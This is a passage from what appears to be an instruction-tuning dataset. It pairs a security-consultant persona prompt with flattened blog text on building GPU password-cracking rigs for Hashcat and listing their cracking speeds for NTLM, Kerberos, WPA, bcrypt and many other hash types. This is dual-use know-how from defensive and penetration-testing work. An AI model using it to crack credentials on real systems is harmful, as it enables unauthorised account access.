        "output": "Kent Ickler The Task Update our in-house password cracking hashing capabilities Purchase a new cracking machine Update the old cracking system Stay within budget Buy The Things ASUS X99-E WS USB 3.1 LGA 2011-v3 Intel X99 SATA 6Gb s USB 3.1 USB 3.0 CEB Intel MotherboardQTY 1 515ww.newegg.com Product Product.aspx?Item N82E16813182968 EVGA GeForce GTX 1080 Ti FE DirectX 12 11G-P4-6390-KRQTY 4 700 2800ww.newegg.com Product Product.aspx?Item N82E16814487335 Intel Core i7-6800K Broadwell-E 6-Core 3.4 GHz LGA 2011-v3 140W BX80671I76800K Desktop ProcessorQTY 1 440ww.newegg.com Product Product.aspx?Item N82E16819117649 G.SKILL TridentZ Series 64GB 4 x 16GB 288-Pin DDR4 SDRAM DDR4 3200 PC4 25600 Intel X99 Platform Desktop Memory Model F4-3200C16Q-64GTZKOQTY 1 509ww.newegg.com Product Product.aspx?Item N82E16820232331 MasterAir Pro 4 CPU Air Cooler with Continuous Direct Contact Technology 2.0 by Cooler MasterQTY 1 46 ww.newegg.com Product Product.aspx?Item N82E16835103229 Athena Power RM-4U8G525 Black SGCC T 1.2mm 4U Rackmount Server Case 2 External 5.25 Drive Bays OEMQTY 1 250ww.newegg.com Product Product.aspx?Item N82E16811192442 Rosewill 1600W Modular Gaming Power Supply Continuous 50 Degree C 80 PLUS GOLD Certified SLI CrossFire Ready HERCULES-1600SQTY 1 350ww.newegg.com Product Product.aspx?Item N82E16817182251 SAMSUNG 850 EVO 2.5 500GB SATA III 3-D Vertical Internal Solid State Drive SSD MZ-75E500B AMQTY 1 200 ww.newegg.com Product Product.aspx?Item N82E16820147373 Total for new password cracking machine 5110 A Few Quick Lessons The CPU cooler doesn't actually clear the case cover This was OK because we don't want to suffocate the GPU's and I hadn't planned on placing the cover on the unit anyway The case was specifically chosen as it was rack-mount with enough room for the motherboard to fit and properly support the four dual slot GPUs A CPU cooler more fitting might be something like this ww.newegg.com Product Product.aspx?Item 9SIA1K65BT9403 The motherboard selected was chosen in part for its support on the M.2 SSD support Unfortunately it doesn't support SATA M.2 which was what I had mistakenly purchased It does support PCIE M.2 for those looking In the build list above you will note I have replaced the data storage with a Samsung 500GB SSD You'll also notice in the photos that I have temporarily used a PNY SSD that we had laying around The Build Piecing the equipment together is pretty straight forward The most complicated part was mounting the CPU cooler fan The cooler supports multiple CPU formats and consequently comes with multiple mounts that must be manipulated in such a way to work with the LGA 2011-v3 socket Motherboard Installing Motherboard in case Note M.2 SATA installed see above CPU CPU Fan fitment note does not clear case top Add Power Supply and Ram GPU's to install GPU Installed ready to be cabled GPU's cabled and readied Note PNY SSD see above The Software Nvidia and Linux are happy together Ubuntu 16.04 LTS server distro with full disk encryption Nvidia drivers directly from the Nvidia website Hashcat 3.5 This took about 15-30 minutes The Nvidia driver's worked great on Ubuntu 16.04 and I didn't have any driver-headaches getting Hashcat to run The Older Brother Updating an older cracking-machine We were under budget and used the excess funds to buy GPU's to replace our old password cracking machine's water-cooled AMD 290x's We chose to replace those 4 GPUs with Nvidia GTX 1070 Founders Edition EVGA GeForce GTX 1070 08G-P4-6170-RX Founders Edition 8GB GDDR5 LED DX12 OSD Support PXOC Graphics CardQTY4 400 1600ww.newegg.com Product Product.aspx?Item N82E16814487326 The Benchmark Numbers The result of this project was a new password cracking machine capable of over 208GH sec NTLM and a refurbished machine capable of an other 119 GH sec NTLM Combined our password cracking hashing capability just topped 327GH sec for NTLM hashes That's 327 000 000 000 password attempts per second.Not bad if comparing our investment to the 21 000 Brutalis that has been seeing 334 GH sec The Benchmark Previews During the design and product selection I was a bit annoyed by the lack of public benchmarks for the GTX 1080TI and GTX 1070 cards Our next post will be exclusively listing our benchmarks from our two most powerful cracking rigs Full Benchmarks on the second part of this blog post OpenCL Platform 1 NVIDIA Corporation Device 1 GeForce GTX 1080 Ti 2793 11172 MB allocatable 28MCU Device 2 GeForce GTX 1080 Ti 2793 11172 MB allocatable 28MCU Device 3 GeForce GTX 1080 Ti 2793 11172 MB allocatable 28MCU Device 4 GeForce GTX 1080 Ti 2792 11169 MB allocatable 28MCU Hashtype MD4 Speed.Dev 1 53850.2 MH s 69.76ms Speed.Dev 2 54047.7 MH s 69.51ms Speed.Dev 3 52955.5 MH s 70.94ms Speed.Dev 4 53750.1 MH s 69.86ms Speed.Dev 214.6 GH s Hashtype MD5 Speed.Dev 1 31103.4 MH s 60.39ms Speed.Dev 2 31676.5 MH s 59.26ms Speed.Dev 3 30600.9 MH s 61.33ms Speed.Dev 4 31198.4 MH s 60.20ms Speed.Dev 124.6 GH s OpenCL Platform 1 NVIDIA Corporation Device 1 GeForce GTX 1070 2028 8112 MB allocatable 15MCU Device 2 GeForce GTX 1070 2028 8114 MB allocatable 15MCU Device 3 GeForce GTX 1070 2028 8114 MB allocatable 15MCU Device 4 GeForce GTX 1070 2028 8114 MB allocatable 15MCU Hashtype MD4 Speed.Dev 1 33622.2 MH s 59.85ms Speed.Dev 2 32953.6 MH s 61.07ms Speed.Dev 3 33108.6 MH s 60.78ms Speed.Dev 4 34089.1 MH s 59.02ms Speed.Dev 133.8 GH s Hashtype MD5 Speed.Dev 1 18534.9 MH s 54.28ms Speed.Dev 2 17880.8 MH s 55.68ms Speed.Dev 3 18188.7 MH s 55.32ms Speed.Dev 4 18401.1 MH s 54.66ms Speed.Dev 73005.5 MH s Top Nvidia 1080TIs password cracker Bottom Nvidia GTX 1070 password cracker The Links Hashcat ashcat.net NVidia Drivers ww.nvidia.com Download index.aspx Ubuntu 16.04 ww.ubuntu.com download server Benchmarks Here"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Hashcat Benchmarks for Nvidia GTX 1080TI & GTX 1070 Hashcat Benchmarks</title>\n<taxonomies>Author, How-To, Kent Ickler, Benchmarks, Hashcat Benchmarks, Kent Ickler, Nvidia GTX, Password Cracker, The Kraken</taxonomies>\n<creation_date>Tue, 20 Jun 2017 15:24:02 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Kent Ickler In my last post I was building a password cracking rig and updating an older rig with new GPU cards I struggled during the design process to find a reliable source of information regarding accurate Hashcat benchmarks As promised I am posting unaltered benchmarks of our default configuration benchmarks Nothing was done to these GPU cards to overclock them or otherwise alter their factory-delivered abilities For more information check out our build blog post here System 1 4x Nvidia GTX 1080 TI System 2 4x Nvidia GTX 1070 scroll down a bit _____ System 1 4x Nvidia GTX 1080 TI MB Asus X99-E WS USB3.1 CPU Intel i7-6800K Broadwell-E 6-core 3.4GHZ RAM G.Skill Tridendz 64GB 4x16 DDR4 3200 PSU Rosewell Hercules 1600w 80 Plus Gold HDD SATA SSD 500GB OS Ubuntu 16.04 CASE Athena Power-RM-4U8G525 Packages Hashcat 3.5 GPU 4x EVGA GeForce GTX 1080 Ti FE hashcat v3.5.0 starting in benchmark mode OpenCL Platform 1 NVIDIA Corporation Device 1 GeForce GTX 1080 Ti 2793 11172 MB allocatable 28MCU Device 2 GeForce GTX 1080 Ti 2793 11172 MB allocatable 28MCU Device 3 GeForce GTX 1080 Ti 2793 11172 MB allocatable 28MCU Device 4 GeForce GTX 1080 Ti 2792 11169 MB allocatable 28MCU Hashtype MD4 Speed.Dev 1 53850.2 MH s 69.76ms Speed.Dev 2 54047.7 MH s 69.51ms Speed.Dev 3 52955.5 MH s 70.94ms Speed.Dev 4 53750.1 MH s 69.86ms Speed.Dev 214.6 GH s Hashtype MD5 Speed.Dev 1 31103.4 MH s 60.39ms Speed.Dev 2 31676.5 MH s 59.26ms Speed.Dev 3 30600.9 MH s 61.33ms Speed.Dev 4 31198.4 MH s 60.20ms Speed.Dev 124.6 GH s Hashtype Half MD5 Speed.Dev 1 20587.6 MH s 91.24ms Speed.Dev 2 20866.0 MH s 90.01ms Speed.Dev 3 19467.0 MH s 92.36ms Speed.Dev 4 20646.6 MH s 90.98ms Speed.Dev 81567.2 MH s Hashtype SHA1 Speed.Dev 1 11374.1 MH s 82.58ms Speed.Dev 2 11535.0 MH s 81.42ms Speed.Dev 3 11213.9 MH s 83.76ms Speed.Dev 4 11431.3 MH s 82.16ms Speed.Dev 45554.3 MH s Hashtype SHA-256 Speed.Dev 1 4426.4 MH s 52.83ms Speed.Dev 2 4476.3 MH s 52.22ms Speed.Dev 3 4358.1 MH s 53.66ms Speed.Dev 4 4443.6 MH s 52.63ms Speed.Dev 17704.4 MH s Hashtype SHA-384 Speed.Dev 1 1394.9 MH s 84.17ms Speed.Dev 2 1401.7 MH s 83.74ms Speed.Dev 3 1371.3 MH s 85.62ms Speed.Dev 4 1379.4 MH s 85.09ms Speed.Dev 5547.2 MH s Hashtype SHA-512 Speed.Dev 1 1511.9 MH s 77.65ms Speed.Dev 2 1524.0 MH s 77.04ms Speed.Dev 3 1487.6 MH s 78.90ms Speed.Dev 4 1504.3 MH s 78.05ms Speed.Dev 6027.8 MH s Hashtype SHA-3 Keccak Speed.Dev 1 1173.9 MH s 99.91ms Speed.Dev 2 1207.5 MH s 48.56ms Speed.Dev 3 1188.6 MH s 49.32ms Speed.Dev 4 1180.1 MH s 49.67ms Speed.Dev 4750.1 MH s Hashtype SipHash Speed.Dev 1 40491.1 MH s 92.78ms Speed.Dev 2 40353.2 MH s 93.10ms Speed.Dev 3 39807.4 MH s 94.38ms Speed.Dev 4 40041.5 MH s 93.83ms Speed.Dev 160.7 GH s Hashtype Skip32 PT salt key pass Speed.Dev 1 5858.0 MH s 1.39ms Speed.Dev 2 5924.2 MH s 1.37ms Speed.Dev 3 5853.9 MH s 1.41ms Speed.Dev 4 5970.5 MH s 1.38ms Speed.Dev 23606.5 MH s Hashtype RIPEMD-160 Speed.Dev 1 6753.6 MH s 69.53ms Speed.Dev 2 6858.1 MH s 68.45ms Speed.Dev 3 6630.3 MH s 70.80ms Speed.Dev 4 6739.4 MH s 69.68ms Speed.Dev 26981.4 MH s Hashtype Whirlpool Speed.Dev 1 357.9 MH s 163.86ms Speed.Dev 2 362.7 MH s 161.71ms Speed.Dev 3 350.4 MH s 167.39ms Speed.Dev 4 357.7 MH s 163.97ms Speed.Dev 1428.7 MH s Hashtype GOST R 34.11-94 Speed.Dev 1 335.7 MH s 87.44ms Speed.Dev 2 340.5 MH s 86.18ms Speed.Dev 3 328.5 MH s 89.36ms Speed.Dev 4 335.3 MH s 87.55ms Speed.Dev 1339.9 MH s Hashtype GOST R 34.11-2012 Streebog 256-bit Speed.Dev 1 70838.3 kH s 204.78ms Speed.Dev 2 71370.8 kH s 203.24ms Speed.Dev 3 68980.4 kH s 210.28ms Speed.Dev 4 70143.4 kH s 206.80ms Speed.Dev 281.3 MH s Hashtype GOST R 34.11-2012 Streebog 512-bit Speed.Dev 1 70886.4 kH s 204.63ms Speed.Dev 2 71401.3 kH s 203.14ms Speed.Dev 3 69004.4 kH s 210.21ms Speed.Dev 4 70166.4 kH s 206.74ms Speed.Dev 281.5 MH s Hashtype DES PT salt key pass Speed.Dev 1 24712.9 MH s 75.97ms Speed.Dev 2 25001.0 MH s 75.08ms Speed.Dev 3 24080.5 MH s 77.97ms Speed.Dev 4 24404.5 MH s 76.92ms Speed.Dev 98198.9 MH s Hashtype 3DES PT salt key pass Speed.Dev 1 772.5 MH s 75.96ms Speed.Dev 2 780.4 MH s 75.21ms Speed.Dev 3 753.5 MH s 77.90ms Speed.Dev 4 764.1 MH s 76.82ms Speed.Dev 3070.5 MH s Hashtype phpass WordPress MD5 phpBB3 MD5 Joomla MD5 Speed.Dev 1 9830.5 kH s 91.84ms Speed.Dev 2 9794.5 kH s 92.16ms Speed.Dev 3 9597.1 kH s 94.09ms Speed.Dev 4 9687.9 kH s 93.21ms Speed.Dev 38910.1 kH s Hashtype scrypt Speed.Dev 1 909.6 kH s 15.51ms Speed.Dev 2 907.6 kH s 15.53ms Speed.Dev 3 892.7 kH s 15.75ms Speed.Dev 4 896.1 kH s 15.67ms Speed.Dev 3605.9 kH s Hashtype PBKDF2-HMAC-MD5 Speed.Dev 1 10267.8 kH s 57.47ms Speed.Dev 2 10310.5 kH s 57.22ms Speed.Dev 3 10032.0 kH s 58.80ms Speed.Dev 4 10140.0 kH s 58.22ms Speed.Dev 40750.3 kH s Hashtype PBKDF2-HMAC-SHA1 Speed.Dev 1 4650.9 kH s 96.95ms Speed.Dev 2 4611.4 kH s 97.76ms Speed.Dev 3 4389.8 kH s 42.80ms Speed.Dev 4 4428.1 kH s 84.94ms Speed.Dev 18080.3 kH s Hashtype PBKDF2-HMAC-SHA256 Speed.Dev 1 1683.0 kH s 58.89ms Speed.Dev 2 1695.7 kH s 58.22ms Speed.Dev 3 1638.8 kH s 60.26ms Speed.Dev 4 1660.4 kH s 59.39ms Speed.Dev 6678.0 kH s Hashtype PBKDF2-HMAC-SHA512 Speed.Dev 1 614.4 kH s 85.15ms Speed.Dev 2 622.8 kH s 84.01ms Speed.Dev 3 601.3 kH s 87.01ms Speed.Dev 4 609.5 kH s 85.84ms Speed.Dev 2448.0 kH s Hashtype Skype Speed.Dev 1 18036.6 MH s 52.04ms Speed.Dev 2 18310.0 MH s 51.27ms Speed.Dev 3 17703.5 MH s 53.05ms Speed.Dev 4 17931.6 MH s 52.37ms Speed.Dev 71981.6 MH s Hashtype WPA WPA2 Speed.Dev 1 576.5 kH s 49.54ms Speed.Dev 2 571.1 kH s 50.02ms Speed.Dev 3 566.5 kH s 50.43ms Speed.Dev 4 563.7 kH s 50.67ms Speed.Dev 2277.9 kH s Hashtype IKE-PSK MD5 Speed.Dev 1 2458.0 MH s 95.13ms Speed.Dev 2 2469.0 MH s 94.70ms Speed.Dev 3 2394.9 MH s 48.97ms Speed.Dev 4 2444.3 MH s 95.69ms Speed.Dev 9766.2 MH s Hashtype IKE-PSK SHA1 Speed.Dev 1 1006.3 MH s 58.24ms Speed.Dev 2 1013.1 MH s 57.88ms Speed.Dev 3 986.8 MH s 59.42ms Speed.Dev 4 996.9 MH s 58.82ms Speed.Dev 4003.2 MH s Hashtype NetNTLMv1 NetNTLMv1 ESS Speed.Dev 1 30360.6 MH s 61.86ms Speed.Dev 2 30506.0 MH s 61.57ms Speed.Dev 3 29605.8 MH s 63.42ms Speed.Dev 4 30205.9 MH s 62.18ms Speed.Dev 120.7 GH s Hashtype NetNTLMv2 Speed.Dev 1 2278.0 MH s 51.53ms Speed.Dev 2 2286.5 MH s 51.34ms Speed.Dev 3 2222.0 MH s 52.82ms Speed.Dev 4 2264.1 MH s 51.82ms Speed.Dev 9050.6 MH s Hashtype IPMI2 RAKP HMAC-SHA1 Speed.Dev 1 2330.0 MH s 50.35ms Speed.Dev 2 2342.9 MH s 50.10ms Speed.Dev 3 2283.5 MH s 51.38ms Speed.Dev 4 2311.2 MH s 50.79ms Speed.Dev 9267.6 MH s Hashtype Kerberos 5 AS-REQ Pre-Auth etype 23 Speed.Dev 1 405.1 MH s 72.45ms Speed.Dev 2 407.3 MH s 72.01ms Speed.Dev 3 396.6 MH s 73.97ms Speed.Dev 4 402.5 MH s 72.91ms Speed.Dev 1611.5 MH s Hashtype Kerberos 5 TGS-REP etype 23 Speed.Dev 1 406.2 MH s 72.26ms Speed.Dev 2 409.2 MH s 71.72ms Speed.Dev 3 395.6 MH s 74.18ms Speed.Dev 4 401.4 MH s 73.12ms Speed.Dev 1612.4 MH s Hashtype DNSSEC NSEC3 Speed.Dev 1 4750.5 MH s 49.22ms Speed.Dev 2 4790.6 MH s 48.81ms Speed.Dev 3 4637.8 MH s 50.42ms Speed.Dev 4 4688.6 MH s 49.87ms Speed.Dev 18867.6 MH s Hashtype PostgreSQL CRAM MD5 Speed.Dev 1 8287.2 MH s 56.66ms Speed.Dev 2 8351.5 MH s 56.22ms Speed.Dev 3 8067.2 MH s 58.20ms Speed.Dev 4 8202.2 MH s 57.25ms Speed.Dev 32908.1 MH s Hashtype MySQL CRAM SHA1 Speed.Dev 1 3271.1 MH s 71.50ms Speed.Dev 2 3282.9 MH s 71.24ms Speed.Dev 3 3201.2 MH s 73.04ms Speed.Dev 4 3221.6 MH s 72.60ms Speed.Dev 12976.8 MH s Hashtype SIP digest authentication MD5 Speed.Dev 1 2783.5 MH s 84.00ms Speed.Dev 2 2812.5 MH s 83.14ms Speed.Dev 3 2711.0 MH s 86.27ms Speed.Dev 4 2747.1 MH s 85.14ms Speed.Dev 11054.0 MH s Hashtype SMF Simple Machines Forum v1.1 Speed.Dev 1 9627.8 MH s 48.77ms Speed.Dev 2 9713.9 MH s 48.33ms Speed.Dev 3 9406.7 MH s 49.88ms Speed.Dev 4 9518.6 MH s 49.28ms Speed.Dev 38267.0 MH s Hashtype vBulletin v3.8.5 Speed.Dev 1 9726.5 MH s 48.26ms Speed.Dev 2 9820.1 MH s 95.65ms Speed.Dev 3 9494.4 MH s 49.45ms Speed.Dev 4 9593.0 MH s 48.94ms Speed.Dev 38634.0 MH s Hashtype vBulletin v3.8.5 Speed.Dev 1 6772.1 MH s 69.34ms Speed.Dev 2 6842.0 MH s 68.61ms Speed.Dev 3 6614.2 MH s 71.00ms Speed.Dev 4 6698.2 MH s 70.11ms Speed.Dev 26926.5 MH s Hashtype IPB2 Invision Power Board MyBB 1.2 Speed.Dev 1 7010.5 MH s 66.98ms Speed.Dev 2 7078.7 MH s 66.31ms Speed.Dev 3 6856.7 MH s 68.49ms Speed.Dev 4 6942.1 MH s 67.64ms Speed.Dev 27888.0 MH s Hashtype WBB3 Woltlab Burning Board Speed.Dev 1 1807.0 MH s 64.93ms Speed.Dev 2 1815.3 MH s 64.65ms Speed.Dev 3 1765.7 MH s 66.49ms Speed.Dev 4 1782.5 MH s 65.86ms Speed.Dev 7170.6 MH s Hashtype OpenCart Speed.Dev 1 2908.8 MH s 80.38ms Speed.Dev 2 2911.6 MH s 80.33ms Speed.Dev 3 2835.7 MH s 82.48ms Speed.Dev 4 2863.1 MH s 81.69ms Speed.Dev 11519.1 MH s Hashtype Joomla 2.5.18 Speed.Dev 1 30788.9 MH s 61.00ms Speed.Dev 2 31062.8 MH s 60.44ms Speed.Dev 3 30092.7 MH s 62.42ms Speed.Dev 4 30438.3 MH s 61.70ms Speed.Dev 122.4 GH s Hashtype PHPS Speed.Dev 1 9689.0 MH s 48.43ms Speed.Dev 2 9784.2 MH s 95.98ms Speed.Dev 3 9491.3 MH s 49.46ms Speed.Dev 4 9580.1 MH s 49.01ms Speed.Dev 38544.6 MH s Hashtype Drupal7 Speed.Dev 1 80204 H s 89.18ms Speed.Dev 2 80375 H s 89.00ms Speed.Dev 3 78338 H s 91.31ms Speed.Dev 4 79178 H s 90.34ms Speed.Dev 318.1 kH s Hashtype osCommerce xt Commerce Speed.Dev 1 17972.4 MH s 52.25ms Speed.Dev 2 18135.8 MH s 51.78ms Speed.Dev 3 17571.1 MH s 53.42ms Speed.Dev 4 17918.2 MH s 52.41ms Speed.Dev 71597.4 MH s Hashtype PrestaShop Speed.Dev 1 11914.1 MH s 78.83ms Speed.Dev 2 11947.2 MH s 78.61ms Speed.Dev 3 11662.3 MH s 80.53ms Speed.Dev 4 11750.4 MH s 79.93ms Speed.Dev 47273.9 MH s Hashtype Django SHA-1 Speed.Dev 1 9588.7 MH s 48.96ms Speed.Dev 2 9632.4 MH s 48.74ms Speed.Dev 3 9367.3 MH s 50.09ms Speed.Dev 4 9499.9 MH s 49.38ms Speed.Dev 38088.4 MH s Hashtype Django PBKDF2-SHA256 Speed.Dev 1 84374 H s 69.42ms Speed.Dev 2 84845 H s 69.05ms Speed.Dev 3 81965 H s 71.45ms Speed.Dev 4 80357 H s 72.89ms Speed.Dev 331.5 kH s Hashtype MediaWiki B type Speed.Dev 1 8668.0 MH s 54.14ms Speed.Dev 2 8968.7 MH s 52.33ms Speed.Dev 3 8721.3 MH s 53.84ms Speed.Dev 4 8868.8 MH s 52.94ms Speed.Dev 35226.7 MH s Hashtype Redmine Speed.Dev 1 3859.3 MH s 60.57ms Speed.Dev 2 3886.6 MH s 60.17ms Speed.Dev 3 3778.8 MH s 61.89ms Speed.Dev 4 3836.5 MH s 60.96ms Speed.Dev 15361.1 MH s Hashtype PunBB Speed.Dev 1 3862.5 MH s 60.55ms Speed.Dev 2 3886.1 MH s 60.18ms Speed.Dev 3 3778.8 MH s 61.89ms Speed.Dev 4 3836.5 MH s 60.96ms Speed.Dev 15363.9 MH s Hashtype PostgreSQL Speed.Dev 1 30687.9 MH s 61.20ms Speed.Dev 2 30826.3 MH s 60.93ms Speed.Dev 3 29954.5 MH s 62.68ms Speed.Dev 4 30409.2 MH s 61.77ms Speed.Dev 121.9 GH s Hashtype MSSQL 2000 Speed.Dev 1 11647.8 MH s 80.62ms Speed.Dev 2 11696.4 MH s 80.29ms Speed.Dev 3 11363.7 MH s 82.65ms Speed.Dev 4 11563.2 MH s 81.22ms Speed.Dev 46271.1 MH s Hashtype MSSQL 2005 Speed.Dev 1 11648.0 MH s 80.63ms Speed.Dev 2 11686.6 MH s 80.33ms Speed.Dev 3 11357.7 MH s 82.66ms Speed.Dev 4 11576.9 MH s 81.13ms Speed.Dev 46269.3 MH s Hashtype MSSQL 2012 2014 Speed.Dev 1 1418.2 MH s 82.76ms Speed.Dev 2 1426.9 MH s 82.28ms Speed.Dev 3 1387.5 MH s 84.62ms Speed.Dev 4 1408.9 MH s 83.32ms Speed.Dev 5641.5 MH s Hashtype MySQL323 Speed.Dev 1 67200.1 MH s 55.90ms Speed.Dev 2 67681.7 MH s 55.50ms Speed.Dev 3 65658.5 MH s 57.19ms Speed.Dev 4 66789.2 MH s 56.24ms Speed.Dev 267.3 GH s Hashtype MySQL4.1 MySQL5 Speed.Dev 1 5247.1 MH s 89.50ms Speed.Dev 2 5260.5 MH s 89.25ms Speed.Dev 3 5132.7 MH s 91.50ms Speed.Dev 4 5183.7 MH s 90.59ms Speed.Dev 20824.0 MH s Hashtype Oracle H Type Oracle 7 Speed.Dev 1 1320.0 MH s 88.90ms Speed.Dev 2 1331.9 MH s 88.13ms Speed.Dev 3 1292.3 MH s 90.85ms Speed.Dev 4 1311.7 MH s 89.51ms Speed.Dev 5255.9 MH s Hashtype Oracle S Type Oracle 11 Speed.Dev 1 11222.5 MH s 83.69ms Speed.Dev 2 11292.1 MH s 83.18ms Speed.Dev 3 10969.7 MH s 85.62ms Speed.Dev 4 11174.8 MH s 84.05ms Speed.Dev 44659.1 MH s Hashtype Oracle T Type Oracle 12 Speed.Dev 1 150.2 kH s 95.26ms Speed.Dev 2 150.7 kH s 95.00ms Speed.Dev 3 146.0 kH s 49.01ms Speed.Dev 4 146.6 kH s 48.83ms Speed.Dev 593.4 kH s Hashtype Sybase ASE Speed.Dev 1 364.0 MH s 80.64ms Speed.Dev 2 364.5 MH s 80.52ms Speed.Dev 3 354.2 MH s 82.86ms Speed.Dev 4 358.9 MH s 81.77ms Speed.Dev 1441.6 MH s Hashtype Episerver 6.x .NET 4 Speed.Dev 1 9627.8 MH s 48.74ms Speed.Dev 2 9642.1 MH s 48.69ms Speed.Dev 3 9392.6 MH s 49.99ms Speed.Dev 4 9523.4 MH s 49.30ms Speed.Dev 38186.0 MH s Hashtype Episerver 6.x .NET 4 Speed.Dev 1 3896.3 MH s 60.02ms Speed.Dev 2 3884.3 MH s 60.21ms Speed.Dev 3 3785.8 MH s 61.75ms Speed.Dev 4 3846.1 MH s 60.81ms Speed.Dev 15412.5 MH s Hashtype Apache apr1 MD5 md5apr1 MD5 APR Speed.Dev 1 14383.9 kH s 62.40ms Speed.Dev 2 14364.7 kH s 62.47ms Speed.Dev 3 13983.6 kH s 64.15ms Speed.Dev 4 14238.6 kH s 63.01ms Speed.Dev 56970.7 kH s Hashtype ColdFusion 10 Speed.Dev 1 2490.5 MH s 94.28ms Speed.Dev 2 2496.0 MH s 94.06ms Speed.Dev 3 2413.7 MH s 48.62ms Speed.Dev 4 2461.9 MH s 95.38ms Speed.Dev 9862.1 MH s Hashtype hMailServer Speed.Dev 1 3895.6 MH s 60.03ms Speed.Dev 2 3881.1 MH s 60.21ms Speed.Dev 3 3782.8 MH s 61.82ms Speed.Dev 4 3847.5 MH s 60.74ms Speed.Dev 15406.9 MH s Hashtype nsldap SHA-1 Base64 Netscape LDAP SHA Speed.Dev 1 11287.5 MH s 83.20ms Speed.Dev 2 11290.6 MH s 83.19ms Speed.Dev 3 11009.4 MH s 85.31ms Speed.Dev 4 11182.0 MH s 84.00ms Speed.Dev 44769.5 MH s Hashtype nsldaps SSHA-1 Base64 Netscape LDAP SSHA Speed.Dev 1 11279.6 MH s 83.24ms Speed.Dev 2 11291.0 MH s 83.19ms Speed.Dev 3 11008.0 MH s 85.32ms Speed.Dev 4 11181.5 MH s 84.00ms Speed.Dev 44760.1 MH s Hashtype SSHA-256 Base64 LDAP SSHA256 Speed.Dev 1 4392.7 MH s 53.23ms Speed.Dev 2 4382.8 MH s 53.35ms Speed.Dev 3 4269.3 MH s 54.77ms Speed.Dev 4 4323.6 MH s 54.08ms Speed.Dev 17368.4 MH s Hashtype SSHA-512 Base64 LDAP SSHA512 Speed.Dev 1 1495.9 MH s 78.45ms Speed.Dev 2 1500.4 MH s 78.23ms Speed.Dev 3 1462.0 MH s 80.30ms Speed.Dev 4 1478.4 MH s 79.41ms Speed.Dev 5936.7 MH s Hashtype LM Speed.Dev 1 22856.7 MH s 82.13ms Speed.Dev 2 22090.6 MH s 85.00ms Speed.Dev 3 22261.5 MH s 84.35ms Speed.Dev 4 20372.6 MH s 92.13ms Speed.Dev 87581.4 MH s Hashtype NTLM Speed.Dev 1 52715.6 MH s 71.26ms Speed.Dev 2 52773.4 MH s 71.16ms Speed.Dev 3 51226.7 MH s 73.34ms Speed.Dev 4 51968.4 MH s 72.28ms Speed.Dev 208.7 GH s Hashtype Domain Cached Credentials DCC MS Cache Speed.Dev 1 15255.7 MH s 61.56ms Speed.Dev 2 15290.7 MH s 61.38ms Speed.Dev 3 14826.5 MH s 63.31ms Speed.Dev 4 15097.1 MH s 62.20ms Speed.Dev 60470.1 MH s Hashtype Domain Cached Credentials 2 DCC2 MS Cache 2 Speed.Dev 1 467.7 kH s 47.99ms Speed.Dev 2 464.2 kH s 48.36ms Speed.Dev 3 460.2 kH s 48.78ms Speed.Dev 4 456.1 kH s 49.23ms Speed.Dev 1848.2 kH s Hashtype MS-AzureSync PBKDF2-HMAC-SHA256 Speed.Dev 1 14331.7 kH s 48.68ms Speed.Dev 2 14208.2 kH s 49.03ms Speed.Dev 3 14079.8 kH s 49.75ms Speed.Dev 4 14063.3 kH s 49.79ms Speed.Dev 56682.9 kH s Hashtype descrypt DES Unix Traditional DES Speed.Dev 1 1283.3 MH s 91.45ms Speed.Dev 2 1291.1 MH s 90.90ms Speed.Dev 3 1256.5 MH s 93.40ms Speed.Dev 4 1271.3 MH s 92.31ms Speed.Dev 5102.2 MH s Hashtype BSDiCrypt Extended DES Speed.Dev 1 2142.7 kH s 70.81ms Speed.Dev 2 2155.0 kH s 70.41ms Speed.Dev 3 2094.8 kH s 72.44ms Speed.Dev 4 2130.4 kH s 71.22ms Speed.Dev 8523.0 kH s Hashtype md5crypt MD5 Unix Cisco-IOS 1 MD5 Speed.Dev 1 14318.2 kH s 62.67ms Speed.Dev 2 14366.2 kH s 62.46ms Speed.Dev 3 13972.2 kH s 64.25ms Speed.Dev 4 14231.0 kH s 63.06ms Speed.Dev 56887.6 kH s Hashtype bcrypt 2 Blowfish Unix Speed.Dev 1 21499 H s 40.62ms Speed.Dev 2 21615 H s 40.40ms Speed.Dev 3 20997 H s 41.55ms Speed.Dev 4 21311 H s 40.94ms Speed.Dev 85422 H s Hashtype sha256crypt 5 SHA256 Unix Speed.Dev 1 531.1 kH s 85.57ms Speed.Dev 2 531.1 kH s 85.59ms Speed.Dev 3 515.8 kH s 88.13ms Speed.Dev 4 524.0 kH s 86.74ms Speed.Dev 2102.1 kH s Hashtype sha512crypt 6 SHA512 Unix Speed.Dev 1 214.7 kH s 53.86ms Speed.Dev 2 213.3 kH s 54.22ms Speed.Dev 3 210.2 kH s 55.02ms Speed.Dev 4 204.0 kH s 56.70ms Speed.Dev 842.3 kH s Hashtype OSX v10.4 OSX v10.5 OSX v10.6 Speed.Dev 1 9579.0 MH s 49.00ms Speed.Dev 2 9644.7 MH s 48.68ms Speed.Dev 3 9366.4 MH s 50.12ms Speed.Dev 4 8863.4 MH s 52.97ms Speed.Dev 37453.4 MH s Hashtype OSX v10.7 Speed.Dev 1 1324.6 MH s 88.63ms Speed.Dev 2 1330.1 MH s 88.27ms Speed.Dev 3 1238.0 MH s 94.81ms Speed.Dev 4 1288.5 MH s 91.03ms Speed.Dev 5181.2 MH s Hashtype OSX v10.8 PBKDF2-SHA512 Speed.Dev 1 17526 H s 95.45ms Speed.Dev 2 17566 H s 95.24ms Speed.Dev 3 14254 H s 58.68ms Speed.Dev 4 14226 H s 58.80ms Speed.Dev 63571 H s Hashtype AIX smd5 Speed.Dev 1 14214.3 kH s 63.14ms Speed.Dev 2 14280.1 kH s 62.80ms Speed.Dev 3 13898.1 kH s 64.54ms Speed.Dev 4 14075.6 kH s 63.77ms Speed.Dev 56468.1 kH s Hashtype AIX ssha1 Speed.Dev 1 61875.4 kH s 49.93ms Speed.Dev 2 61743.2 kH s 50.05ms Speed.Dev 3 60304.1 kH s 51.12ms Speed.Dev 4 61363.8 kH s 50.27ms Speed.Dev 245.3 MH s Hashtype AIX ssha256 Speed.Dev 1 24025.2 